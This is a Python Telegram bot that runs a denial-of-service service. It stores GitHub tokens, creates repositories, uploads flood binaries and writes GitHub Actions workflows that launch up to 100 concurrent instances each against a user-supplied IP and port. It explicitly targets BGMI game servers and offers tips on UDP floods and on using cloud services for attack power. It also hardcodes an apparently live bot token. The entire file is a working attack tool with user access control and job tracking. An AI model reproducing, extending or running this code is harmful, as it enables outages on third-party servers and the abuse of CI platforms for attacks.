import os
import json
import asyncio
import time
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from github import Github, GithubException

# Bot Configuration
BOT_TOKEN = "8587714106:AAFc9sw8Bt7A5GnjiNYAHSVm5TrcjAQCclw"
OWNER_USER_ID = 6434780221

# Storage files
TOKENS_FILE = "tokens.json"
USERS_FILE = "users.json"
ATTACK_JOBS_FILE = "attack_jobs.json"
BINARY_STORAGE = "binaries/"

# MAXIMUM POWER CONFIGURATION
MAX_CONCURRENT_ATTACKS = 2
MAX_INSTANCES = 100  # TRIPLED FOR MAXIMUM POWER
INSTANT_EFFECT_MODE = True
CONSTANT_POWER_BOOST = 5.0  # INCREASED BOOST

# Initialize storage
def init_storage():
    if not os.path.exists(TOKENS_FILE):
        with open(TOKENS_FILE, 'w') as f:
            json.dump({"tokens": []}, f)
    
    if not os.path.exists(USERS_FILE):
        with open(USERS_FILE, 'w') as f:
            json.dump({"users": [OWNER_USER_ID]}, f)
    
    if not os.path.exists(ATTACK_JOBS_FILE):
        with open(ATTACK_JOBS_FILE, 'w') as f:
            json.dump({"jobs": {}}, f)
    
    if not os.path.exists(BINARY_STORAGE):
        os.makedirs(BINARY_STORAGE)

# Load tokens
def load_tokens():
    with open(TOKENS_FILE, 'r') as f:
        return json.load(f)["tokens"]

# Save tokens
def save_tokens(tokens):
    with open(TOKENS_FILE, 'w') as f:
        json.dump({"tokens": tokens}, f)

# Load users
def load_users():
    with open(USERS_FILE, 'r') as f:
        return json.load(f)["users"]

# Save users
def save_users(users):
    with open(USERS_FILE, 'w') as f:
        json.dump({"users": users}, f)

# Load jobs
def load_jobs():
    with open(ATTACK_JOBS_FILE, 'r') as f:
        return json.load(f)["jobs"]

# Save jobs
def save_jobs(jobs):
    with open(ATTACK_JOBS_FILE, 'w') as f:
        json.dump({"jobs": jobs}, f)

# Check if user is authorized
def is_authorized(user_id):
    users = load_users()
    return user_id in users

# Check if user is owner
def is_owner(user_id):
    return user_id == OWNER_USER_ID

def get_running_attacks_count():
    """Count how many attacks are currently running"""
    jobs = load_jobs()
    running_count = 0
    current_time = time.time()
    
    for job_id, job_info in jobs.items():
        if job_info.get('status') == 'running':
            start_time = job_info.get('start_time', 0)
            attack_time = int(job_info.get('time', 0))
            
            elapsed_time = current_time - start_time
            if elapsed_time <= (attack_time + 60):
                running_count += 1
            else:
                jobs[job_id]['status'] = 'completed'
    
    save_jobs(jobs)
    return running_count

def calculate_attack_power(tokens_count, repos_triggered):
    """Calculate MAXIMUM attack power"""
    WORKFLOW_POWER = 2000  # DOUBLED FOR MAXIMUM POWER
    
    total_power = tokens_count * repos_triggered * WORKFLOW_POWER * CONSTANT_POWER_BOOST
    power_gbps = total_power / 1000
    
    return power_gbps

def create_flame_repos(token):
    """Create 4 flame repositories for parallel execution"""
    try:
        g = Github(token)
        user = g.get_user()
        repos = []
        
        repo_names = ["flame1", "flame2", "flame3", "flame4"]
        
        for repo_name in repo_names:
            try:
                repo = user.get_repo(repo_name)
                repos.append(repo)
                print(f"✅ Using existing repo: {repo_name}")
            except GithubException:
                repo = user.create_repo(repo_name, private=False, auto_init=True)
                repos.append(repo)
                print(f"✅ Created new repo: {repo_name}")
                
        return repos
    except Exception as e:
        print(f"Repo creation error: {e}")
        return None

def clean_and_recreate_repos(token):
    """DELETE all existing repos and create NEW ones"""
    try:
        g = Github(token)
        user = g.get_user()
        
        repo_names = ["flame1", "flame2", "flame3", "flame4"]
        deleted_count = 0
        created_count = 0
        
        # DELETE existing repos
        for repo_name in repo_names:
            try:
                repo = user.get_repo(repo_name)
                repo.delete()
                deleted_count += 1
                print(f"✅ Deleted repo: {repo_name}")
            except GithubException:
                print(f"ℹ️ Repo {repo_name} not found (already deleted)")
            except Exception as e:
                print(f"❌ Error deleting {repo_name}: {e}")
        
        # Wait a moment for deletion to complete
        time.sleep(2)
        
        # CREATE new repos
        for repo_name in repo_names:
            try:
                repo = user.create_repo(repo_name, private=False, auto_init=True)
                created_count += 1
                print(f"✅ Created new repo: {repo_name}")
            except Exception as e:
                print(f"❌ Error creating {repo_name}: {e}")
        
        return deleted_count, created_count
        
    except Exception as e:
        print(f"Clean repos error: {e}")
        return 0, 0

def update_workflow_and_trigger(token, ip, port, attack_time, job_id):
    """Update workflow with MIXED BINARIES - 4TH BINARY 4000 THREADS"""
    try:
        g = Github(token)
        user = g.get_user()
        
        repo_names = ["flame1", "flame2", "flame3", "flame4"]
        success_count = 0
        
        for i, repo_name in enumerate(repo_names):
            try:
                repo = user.get_repo(repo_name)
                
                # DIFFERENT BINARIES FOR DIFFERENT REPOS
                if i == 0:
                    # FIRST REPO: soulcracks - MAX POWER
                    chmod_command = "chmod +x soulcracks"
                    run_command = f"./soulcracks {ip} {port} {attack_time} 65535"
                    binary_name = "soulcracks"
                    threads = 65535
                elif i == 1:
                    # SECOND REPO: soul - HIGH POWER
                    chmod_command = "chmod +x soul"
                    run_command = f"./soul {ip} {port} {attack_time} 50000"
                    binary_name = "soul"
                    threads = 50000
                elif i == 2:
                    # THIRD REPO: soul - HIGH POWER
                    chmod_command = "chmod +x soul"
                    run_command = f"./soul {ip} {port} {attack_time} 50000"
                    binary_name = "soul"
                    threads = 50000
                else:
                    # FOURTH REPO: soul - LOW POWER (4000 threads)
                    chmod_command = "chmod +x soul"
                    run_command = f"./soul {ip} {port} {attack_time} 4000"
                    binary_name = "soul"
                    threads = 4000
                
                instances = MAX_INSTANCES
                
                # WORKFLOW WITHOUT ECHO MESSAGES
                yml_content = f"""name: SERVER OVERLOAD ATTACK
on: [workflow_dispatch, push]

jobs:
  server_overload:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - run: {chmod_command}
      - run: |
          for i in {{1..{instances}}}; do
            {run_command} &
          done
          wait
"""
                
                commit_message = f"Server Overload {ip}:{port}"
                workflow_path = ".github/workflows/attack.yml"
                
                # Update workflow
                try:
                    contents = repo.get_contents(workflow_path)
                    repo.update_file(contents.path, commit_message, yml_content, contents.sha)
                except:
                    repo.create_file(workflow_path, commit_message, yml_content)
                
                # Trigger workflow
                workflows = repo.get_workflows()
                for workflow in workflows:
                    if workflow.name == "SERVER OVERLOAD ATTACK":
                        try:
                            workflow.create_dispatch(ref="main")
                            success_count += 1
                            print(f"✅ Triggered {binary_name} with {threads} threads in {repo_name}")
                            break
                        except Exception as e:
                            print(f"Dispatch error: {e}")
                            try:
                                repo.create_file("trigger.txt", "Trigger", str(time.time()))
                                success_count += 1
                            except:
                                continue
                
            except Exception as e:
                print(f"Error in {repo_name}: {e}")
                continue
        
        return success_count
        
    except Exception as e:
        print(f"Workflow error: {e}")
        return 0

def upload_binary_to_repos(token, binary_contents):
    """Upload different binaries to different repositories"""
    try:
        g = Github(token)
        user = g.get_user()
        
        repo_names = ["flame1", "flame2", "flame3", "flame4"]
        success_count = 0
        
        for i, repo_name in enumerate(repo_names):
            try:
                if i >= len(binary_contents):
                    print(f"❌ Not enough binaries for {repo_name}")
                    continue
                    
                repo = user.get_repo(repo_name)
                binary_content = binary_contents[i]
                
                # FIRST REPO: soulcracks, OTHERS: soul
                if i == 0:
                    filename = "soulcracks"
                else:
                    filename = "soul"
                
                try:
                    contents = repo.get_contents(filename)
                    repo.update_file(contents.path, f"Update {filename} binary", binary_content, contents.sha)
                except:
                    repo.create_file(filename, f"Add {filename} binary", binary_content)
                
                success_count += 1
                print(f"✅ Uploaded {filename} to {repo_name}")
                
            except Exception as e:
                print(f"Upload error to {repo_name}: {e}")
                continue
        
        return success_count
    except Exception as e:
        print(f"Upload error: {e}")
        return 0

def get_workflow_status(token):
    """Get workflow status from all 4 repos"""
    try:
        g = Github(token)
        user = g.get_user()
        
        repo_names = ["flame1", "flame2", "flame3", "flame4"]
        running_count = 0
        completed_count = 0
        
        for repo_name in repo_names:
            try:
                repo = user.get_repo(repo_name)
                workflows = repo.get_workflows()
                
                for workflow in workflows:
                    runs = workflow.get_runs()
                    for run in runs:
                        if run.status == "in_progress":
                            running_count += 1
                        elif run.status == "completed":
                            completed_count += 1
            except:
                continue
        
        return running_count, completed_count
    except Exception as e:
        print(f"Status error: {e}")
        return 0, 0

def get_all_workflows_status():
    tokens = load_tokens()
    total_running = 0
    total_completed = 0
    
    for token in tokens:
        try:
            running, completed = get_workflow_status(token)
            total_running += running
            total_completed += completed
        except:
            pass
    
    return total_running, total_completed

def cancel_all_workflows():
    """Cancel all running workflows from all repos"""
    tokens = load_tokens()
    cancelled_count = 0
    
    for token in tokens:
        try:
            g = Github(token)
            user = g.get_user()
            
            repo_names = ["flame1", "flame2", "flame3", "flame4"]
            
            for repo_name in repo_names:
                try:
                    repo = user.get_repo(repo_name)
                    workflows = repo.get_workflows()
                    
                    for workflow in workflows:
                        runs = workflow.get_runs()
                        for run in runs:
                            if run.status == "in_progress":
                                try:
                                    run.cancel()
                                    cancelled_count += 1
                                except:
                                    pass
                except:
                    continue
        except Exception as e:
            print(f"Cancel error: {e}")
    
    return cancelled_count

# Store uploaded binaries temporarily
uploaded_binaries = []

# EXTERNAL SERVER RECOMMENDATIONS
EXTERNAL_SERVERS = {
    "vps": [
        "🌐 DigitalOcean Droplets - $5/month",
        "🌐 Vultr VPS - $6/month", 
        "🌐 AWS EC2 - Free tier available",
        "🌐 Google Cloud - $300 free credits",
        "🌐 Azure VMs - Free for students"
    ],
    "methods": [
        "🚀 Direct VPS DDoS - Maximum power",
        "🚀 Multi-server coordination", 
        "🚀 Cloudflare Workers bypass",
        "🚀 AWS Lambda functions",
        "🚀 Google Cloud Functions"
    ],
    "tools": [
        "🛠️ Custom C++ DDoS tools",
        "🛠️ Python multiprocessing attacks", 
        "🛠️ Node.js cluster attacks",
        "🛠️ GoLang high-performance tools",
        "🛠️ Rust maximum efficiency tools"
    ]
}

# Telegram bot commands
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_authorized(update.effective_user.id):
        await update.message.reply_text("❌ You are not authorized to use this bot!")
        return
    
    running_attacks = get_running_attacks_count()
    tokens_count = len(load_tokens())
    
    user_commands = "🟢 User Commands:\n/attack ip port time\n/status\n/stop\n/power\n/servers\n\n"
    owner_commands = "👑 Owner Commands:\n/token\n/tokens\n/add user_id\n/remove user_id\n/users\n/addbinary\n/cleanrepos\n\n"
    
    status_info = f"📊 Current Status: {running_attacks}/{MAX_CONCURRENT_ATTACKS} attacks running\n"
    status_info += f"🔑 Active Tokens: {tokens_count}\n"
    status_info += f"⚡ Server Overload: INSTANT 'NOT RESPONDING' POPUP\n"
    status_info += f"🛠️ Binaries: soulcracks + soul mixed setup\n\n"
    
    if is_owner(update.effective_user.id):
        await update.message.reply_text(
            f"💥 SERVER OVERLOAD BOT READY!\n\n"
            f"{status_info}"
            f"✅ 100 Instances per Repository\n"
            f"✅ Mixed Threads: 65,535 + 50,000 + 50,000 + 4,000\n"
            f"✅ Instant Server Crash\n"
            f"✅ Mixed Binaries: soulcracks + soul\n"
            f"✅ Clean Repos Option Available\n\n"
            f"{user_commands}{owner_commands}"
        )
    else:
        await update.message.reply_text(
            f"💥 SERVER OVERLOAD BOT READY!\n\n"
            f"{status_info}"
            f"✅ Instant Server Crash\n"
            f"✅ BGMI Error Popup Expected\n\n"
            f"{user_commands}"
        )

# CLEAN REPOS COMMAND
async def clean_repos(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("❌ Only owner can use this command!")
        return
    
    tokens = load_tokens()
    if not tokens:
        await update.message.reply_text("❌ No GitHub tokens added! Use /token first.")
        return
    
    await update.message.reply_text("🧹 CLEANING ALL REPOSITORIES...")
    
    total_deleted = 0
    total_created = 0
    
    for token in tokens:
        try:
            g = Github(token)
            user = g.get_user()
            deleted, created = clean_and_recreate_repos(token)
            total_deleted += deleted
            total_created += created
            
            await update.message.reply_text(
                f"✅ Token: {user.login}\n"
                f"🗑️ Deleted: {deleted} repos\n"
                f"🆕 Created: {created} repos\n"
            )
            
        except Exception as e:
            await update.message.reply_text(f"❌ Error cleaning token: {str(e)}")
    
    # Re-upload binaries after cleaning
    global uploaded_binaries
    if uploaded_binaries:
        await update.message.reply_text("🔄 Re-uploading binaries to clean repos...")
        for token in tokens:
            upload_binary_to_repos(token, uploaded_binaries)
    
    await update.message.reply_text(
        f"🎉 REPOSITORY CLEANING COMPLETED!\n\n"
        f"🗑️ Total Deleted: {total_deleted} repositories\n"
        f"🆕 Total Created: {total_created} repositories\n"
        f"🔑 Tokens Processed: {len(tokens)}\n"
        f"🚀 All repos are now FRESH & READY!\n\n"
        f"💡 Use /addbinary to upload binaries again if needed"
    )

# EXTERNAL SERVERS COMMAND
async def show_servers(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_authorized(update.effective_user.id):
        await update.message.reply_text("❌ You are not authorized to use this bot!")
        return
    
    servers_message = "🌐 EXTERNAL SERVER RECOMMENDATIONS\n\n"
    
    servers_message += "💻 VPS PROVIDERS:\n"
    for server in EXTERNAL_SERVERS["vps"]:
        servers_message += f"• {server}\n"
    
    servers_message += "\n🚀 ATTACK METHODS:\n"
    for method in EXTERNAL_SERVERS["methods"]:
        servers_message += f"• {method}\n"
    
    servers_message += "\n🛠️ TOOLS & TECHNOLOGIES:\n"
    for tool in EXTERNAL_SERVERS["tools"]:
        servers_message += f"• {tool}\n"
    
    servers_message += "\n💡 TIPS:\n"
    servers_message += "• Use multiple VPS for maximum power\n"
    servers_message += "• Combine with GitHub Actions for hybrid attacks\n"
    servers_message += "• Target multiple game server ports simultaneously\n"
    servers_message += "• Use UDP floods for game servers\n"
    
    await update.message.reply_text(servers_message)

# OWNER ONLY COMMANDS
async def add_token(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("❌ Only owner can use this command!")
        return
    
    if not context.args:
        await update.message.reply_text("Please provide a GitHub token: /token YOUR_GITHUB_TOKEN")
        return
    
    token = context.args[0]
    tokens = load_tokens()
    
    if token in tokens:
        await update.message.reply_text("⚠️ This token is already added!")
        return
    
    try:
        g = Github(token)
        user = g.get_user()
        
        repos = create_flame_repos(token)
        if repos:
            tokens.append(token)
            save_tokens(tokens)
            await update.message.reply_text(
                f"✅ TOKEN ADDED!\n"
                f"👤 User: {user.login}\n"
                f"🏠 Repos: flame1, flame2, flame3, flame4\n"
                f"💥 Server Overload: +8 Gbps capacity\n"
                f"🚀 Total Capacity: {len(tokens) * 8} Gbps"
            )
        else:
            await update.message.reply_text("❌ Failed to create repos!")
    except Exception as e:
        await update.message.reply_text(f"❌ Invalid token: {str(e)}")

async def list_tokens(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("❌ Only owner can use this command!")
        return
    
    tokens = load_tokens()
    if not tokens:
        await update.message.reply_text("No tokens added yet!")
        return
    
    message = f"🔑 Active Tokens ({len(tokens)}):\n\n"
    for i, token in enumerate(tokens, 1):
        try:
            g = Github(token)
            user = g.get_user()
            message += f"{i}. {user.login} (4 repos = 8 Gbps)\n"
        except:
            message += f"{i}. ❌ Invalid\n"
    
    total_power = len(tokens) * 8
    message += f"\n💥 Total Power Capacity: {total_power} Gbps"
    message += f"\n🎯 Effect: INSTANT SERVER CRASH"
    message += f"\n📈 Expected: 'SERVER NOT RESPONDING' POPUP"
    message += f"\n🛠️ Binaries: soulcracks + soul mixed"
    message += f"\n🧵 Threads: 65,535 + 50,000 + 50,000 + 4,000"
    
    await update.message.reply_text(message)

async def add_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("❌ Only owner can use this command!")
        return
    
    if not context.args:
        await update.message.reply_text("Usage: /add USER_ID")
        return
    
    try:
        user_id = int(context.args[0])
        users = load_users()
        
        if user_id in users:
            await update.message.reply_text("⚠️ User already added!")
            return
        
        users.append(user_id)
        save_users(users)
        await update.message.reply_text(f"✅ User {user_id} added successfully!")
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID!")

async def remove_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("❌ Only owner can use this command!")
        return
    
    if not context.args:
        await update.message.reply_text("Usage: /remove USER_ID")
        return
    
    try:
        user_id = int(context.args[0])
        users = load_users()
        
        if user_id == OWNER_USER_ID:
            await update.message.reply_text("❌ Cannot remove owner!")
            return
        
        if user_id not in users:
            await update.message.reply_text("❌ User not found!")
            return
        
        users.remove(user_id)
        save_users(users)
        await update.message.reply_text(f"✅ User {user_id} removed successfully!")
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID!")

async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("❌ Only owner can use this command!")
        return
    
    users = load_users()
    message = "👥 Authorized Users:\n\n"
    for user_id in users:
        status = "👑 Owner" if user_id == OWNER_USER_ID else "👤 User"
        message += f"{status}: {user_id}\n"
    
    await update.message.reply_text(message)

async def add_binary(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("❌ Only owner can use this command!")
        return
    
    tokens = load_tokens()
    if not tokens:
        await update.message.reply_text("❌ No GitHub tokens added! Use /token first.")
        return
    
    global uploaded_binaries
    uploaded_binaries = []
    
    await update.message.reply_text(
        "📤 UPLOAD 4 BINARY FILES:\n\n"
        "1. First file → soulcracks (./soulcracks IP PORT TIME 65535)\n"
        "2. Second file → soul (./soul IP PORT TIME 50000)\n" 
        "3. Third file → soul (./soul IP PORT TIME 50000)\n"
        "4. Fourth file → soul (./soul IP PORT TIME 4000)\n\n"
        "💥 MIXED THREAD CONFIGURATION READY!"
    )

async def handle_binary(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("❌ Only owner can use this command!")
        return
    
    if not update.message.document:
        await update.message.reply_text("❌ Please send a file!")
        return
    
    global uploaded_binaries
    
    file = await update.message.document.get_file()
    file_path = f"temp_binary_{len(uploaded_binaries)}"
    await file.download_to_drive(file_path)
    
    with open(file_path, 'rb') as f:
        binary_content = f.read()
    
    os.remove(file_path)
    
    uploaded_binaries.append(binary_content)
    
    await update.message.reply_text(f"✅ Binary {len(uploaded_binaries)}/4 uploaded!")
    
    if len(uploaded_binaries) == 4:
        await distribute_binaries(update)

async def distribute_binaries(update: Update):
    global uploaded_binaries
    
    tokens = load_tokens()
    total_success = 0
    
    await update.message.reply_text("🔄 Distributing binaries...")
    
    for token in tokens:
        success_count = upload_binary_to_repos(token, uploaded_binaries)
        total_success += success_count
    
    await update.message.reply_text(
        f"💥 MIXED THREAD CONFIGURATION COMPLETE!\n\n"
        f"📊 Updated: {total_success} repositories\n"
        f"🔑 Tokens: {len(tokens)}\n"
        f"💥 Power: {len(tokens) * 8} Gbps capacity\n"
        f"🎯 Effect: INSTANT SERVER CRASH\n"
        f"📈 Expected: BGMI 'Server Not Responding' Popup\n"
        f"🛠️ Binaries: soulcracks + soul mixed\n"
        f"🧵 Threads: 65,535 + 50,000 + 50,000 + 4,000\n\n"
        f"🚀 READY FOR SERVER OVERLOAD ATTACKS!"
    )
    
    uploaded_binaries = []

# POWER MONITORING COMMAND
async def show_power(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_authorized(update.effective_user.id):
        await update.message.reply_text("❌ You are not authorized to use this bot!")
        return
    
    tokens_count = len(load_tokens())
    running, completed = get_all_workflows_status()
    running_attacks = get_running_attacks_count()
    
    total_power_gbps = tokens_count * 8
    current_power_gbps = running_attacks * 6
    
    power_message = f"💥 SERVER OVERLOAD POWER STATUS\n\n"
    power_message += f"🔑 Active Tokens: {tokens_count}\n"
    power_message += f"🏠 Total Repositories: {tokens_count * 4}\n"
    power_message += f"🔥 Running Workflows: {running}\n"
    power_message += f"✅ Completed Workflows: {completed}\n"
    power_message += f"🎯 Active Attacks: {running_attacks}/{MAX_CONCURRENT_ATTACKS}\n\n"
    power_message += f"💪 MAXIMUM CAPACITY: {total_power_gbps} Gbps\n"
    power_message += f"⚡ CURRENT POWER: {current_power_gbps} Gbps\n"
    power_message += f"🎯 EFFECT: INSTANT SERVER CRASH\n"
    power_message += f"📈 EXPECTED: 'SERVER NOT RESPONDING' POPUP\n"
    power_message += f"🛠️ BINARIES: soulcracks + soul mixed\n"
    power_message += f"🧵 THREADS: 65,535 + 50,000 + 50,000 + 4,000\n\n"
    
    if running_attacks > 0:
        power_message += f"🚀 SERVER OVERLOAD ACTIVE!\n"
        power_message += f"📈 Expecting BGMI Error Popup Shortly!\n"
    else:
        power_message += "💤 NO ACTIVE ATTACKS\n"
    
    power_message += f"\nUse /attack for SERVER OVERLOAD!"
    power_message += f"\nUse /servers for external server options"
    power_message += f"\nUse /cleanrepos to refresh repositories"
    
    await update.message.reply_text(power_message)

# USER COMMANDS
async def start_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_authorized(update.effective_user.id):
        await update.message.reply_text("❌ You are not authorized to use this bot!")
        return
    
    if len(context.args) != 3:
        await update.message.reply_text("❌ Usage: /attack IP PORT TIME")
        return
    
    # CHECK ATTACK LIMIT
    running_attacks = get_running_attacks_count()
    if running_attacks >= MAX_CONCURRENT_ATTACKS:
        await update.message.reply_text(
            f"🚫 ATTACK LIMIT REACHED!\n\n"
            f"📊 Current: {running_attacks}/{MAX_CONCURRENT_ATTACKS} attacks running\n"
            f"⏳ Please wait for current attacks to finish\n"
            f"🔔 You will get a notification when ready!"
        )
        return
    
    ip, port, attack_time = context.args
    tokens = load_tokens()
    
    if not tokens:
        await update.message.reply_text("❌ No GitHub tokens added! Owner needs to add tokens first.")
        return
    
    await update.message.reply_text("💥 LAUNCHING SERVER OVERLOAD ATTACK...")
    
    total_success = 0
    total_failed = 0
    job_id = str(int(time.time()))
    jobs = load_jobs()
    
    # Store job information
    jobs[job_id] = {
        'ip': ip,
        'port': port,
        'time': attack_time,
        'start_time': time.time(),
        'user_id': update.effective_user.id,
        'chat_id': update.message.chat_id,
        'tokens_used': [],
        'repos_triggered': 0,
        'status': 'running'
    }
    
    # Launch attacks on ALL tokens
    for token in tokens:
        try:
            g = Github(token)
            user = g.get_user()
            
            success_count = update_workflow_and_trigger(token, ip, port, attack_time, job_id)
            if success_count > 0:
                total_success += success_count
                jobs[job_id]['tokens_used'].append(f"{user.login} ({success_count} repos)")
                jobs[job_id]['repos_triggered'] += success_count
            else:
                total_failed += 1
                
        except Exception as e:
            total_failed += 1
            print(f"Attack error: {e}")
    
    jobs[job_id]['success_count'] = total_success
    save_jobs(jobs)
    
    # Calculate REAL power output
    tokens_count = len(tokens)
    total_power_gbps = calculate_attack_power(tokens_count, total_success)
    
    running_attacks = get_running_attacks_count()
    
    await update.message.reply_text(
        f"💥 SERVER OVERLOAD ATTACK LAUNCHED!\n\n"
        f"🎯 Target: {ip}:{port}\n"
        f"⏰ Time: {attack_time}s\n"
        f"🔑 Tokens Used: {tokens_count}\n"
        f"🏠 Repos Triggered: {total_success}\n"
        f"📊 Job ID: {job_id}\n"
        f"🔢 Active Attacks: {running_attacks}/{MAX_CONCURRENT_ATTACKS}\n\n"
        f"⚡ REAL POWER OUTPUT: {total_power_gbps:.1f} Gbps\n"
        f"🎯 EXPECTED EFFECT: SERVER CAN'T RESPOND\n"
        f"📈 BGMI POPUP: 'SERVER NOT RESPONDING'\n"
        f"🛠️ BINARIES: soulcracks + soul mixed\n"
        f"🧵 THREADS: 65,535 + 50,000 + 50,000 + 4,000\n"
        f"💪 Instant Overload: 100 instances per repo\n\n"
        f"🔔 SERVER SHOULD CRASH WITHIN 10-30 SECONDS!\n"
        f"📱 Look for 'Server Not Responding' in BGMI!\n\n"
        f"💡 Use /cleanrepos to refresh repositories if needed"
    )
    
    # Start monitoring
    if total_success > 0:
        asyncio.create_task(monitor_job_completion(job_id))

async def check_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_authorized(update.effective_user.id):
        await update.message.reply_text("❌ You are not authorized to use this bot!")
        return
    
    running, completed = get_all_workflows_status()
    running_attacks = get_running_attacks_count()
    tokens_count = len(load_tokens())
    
    status_message = f"📊 SERVER OVERLOAD STATUS\n\n"
    status_message += f"🟢 Running Workflows: {running}\n"
    status_message += f"✅ Completed Workflows: {completed}\n"
    status_message += f"🔥 Active Attacks: {running_attacks}/{MAX_CONCURRENT_ATTACKS}\n"
    status_message += f"🔑 Total Tokens: {tokens_count}\n"
    status_message += f"🏠 Total Repositories: {tokens_count * 4}\n"
    status_message += f"🎯 Expected Effect: SERVER CRASH\n"
    status_message += f"📈 BGMI Popup: 'Server Not Responding'\n"
    status_message += f"🛠️ Binaries: soulcracks + soul mixed\n"
    status_message += f"🧵 Threads: 65,535 + 50,000 + 50,000 + 4,000\n\n"
    
    if running_attacks >= MAX_CONCURRENT_ATTACKS:
        status_message += "🚫 ATTACK LIMIT REACHED!\n"
        status_message += "⏳ Wait for current attacks to finish\n"
    elif running_attacks > 0:
        status_message += "✅ You can launch more attacks!\n"
        remaining_slots = MAX_CONCURRENT_ATTACKS - running_attacks
        status_message += f"🎯 {remaining_slots} attack slots available\n"
    else:
        status_message += "💤 No active attacks - Ready to go!\n"
    
    status_message += f"\nUse /servers for external power options"
    status_message += f"\nUse /cleanrepos to refresh repositories"
    
    await update.message.reply_text(status_message)

async def stop_attacks(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_authorized(update.effective_user.id):
        await update.message.reply_text("❌ You are not authorized to use this bot!")
        return
    
    await update.message.reply_text("🛑 Stopping all attacks...")
    
    cancelled_count = cancel_all_workflows()
    
    jobs = load_jobs()
    stopped_jobs = 0
    for job_id, job_info in jobs.items():
        if job_info.get('status') == 'running':
            jobs[job_id]['status'] = 'stopped'
            stopped_jobs += 1
    
    save_jobs(jobs)
    
    await update.message.reply_text(
        f"✅ ALL ATTACKS STOPPED!\n\n"
        f"🛑 Cancelled Workflows: {cancelled_count}\n"
        f"📊 Stopped Jobs: {stopped_jobs}\n\n"
        f"🚀 You can start new attacks now!"
    )

async def monitor_job_completion(job_id):
    """Monitor job completion"""
    app = Application.builder().token(BOT_TOKEN).build()
    
    jobs = load_jobs()
    if job_id not in jobs:
        return
    
    attack_time = int(jobs[job_id]['time'])
    user_id = jobs[job_id]['user_id']
    chat_id = jobs[job_id]['chat_id']
    
    await asyncio.sleep(attack_time + 30)
    
    jobs = load_jobs()
    if job_id not in jobs:
        return
    
    if jobs[job_id].get('status') == 'stopped':
        return
    
    jobs[job_id]['status'] = 'completed'
    save_jobs(jobs)
    
    running_attacks = get_running_attacks_count()
    
    await app.bot.send_message(
        chat_id=chat_id,
        text=f"✅ SERVER OVERLOAD ATTACK COMPLETED!\n\n"
             f"🎯 Job ID: {job_id}\n"
             f"⏰ Duration: {attack_time}s\n"
             f"🏠 Repos Used: {jobs[job_id]['repos_triggered']}\n"
             f"📊 Active Attacks: {running_attacks}/{MAX_CONCURRENT_ATTACKS}\n\n"
             f"🚀 NOW YOU CAN ATTACK AGAIN!\n"
             f"Use /attack for instant server overload!\n"
             f"Use /cleanrepos to refresh repositories"
    )

# Main function
def main():
    init_storage()
    
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Add handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("attack", start_attack))
    application.add_handler(CommandHandler("status", check_status))
    application.add_handler(CommandHandler("stop", stop_attacks))
    application.add_handler(CommandHandler("power", show_power))
    application.add_handler(CommandHandler("servers", show_servers))
    application.add_handler(CommandHandler("cleanrepos", clean_repos))
    
    # Owner commands
    application.add_handler(CommandHandler("token", add_token))
    application.add_handler(CommandHandler("tokens", list_tokens))
    application.add_handler(CommandHandler("add", add_user))
    application.add_handler(CommandHandler("remove", remove_user))
    application.add_handler(CommandHandler("users", list_users))
    application.add_handler(CommandHandler("addbinary", add_binary))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_binary))
    
    print("💥 SERVER OVERLOAD BOT IS RUNNING...")
    print(f"👑 Owner ID: {OWNER_USER_ID}")
    print("✅ 100 Instances per Repository")
    print("✅ Mixed Threads: 65,535 + 50,000 + 50,000 + 4,000") 
    print("✅ Instant Server Crash")
    print("✅ BGMI 'Server Not Responding' Popup")
    print("✅ Mixed Binaries: soulcracks + soul")
    print("✅ Clean Repos Command: /cleanrepos")
    print("✅ No Echo Messages - Fixed 'Message too long'")
    print("✅ External Server Recommendations")
    application.run_polling()

if __name__ == "__main__":
    main()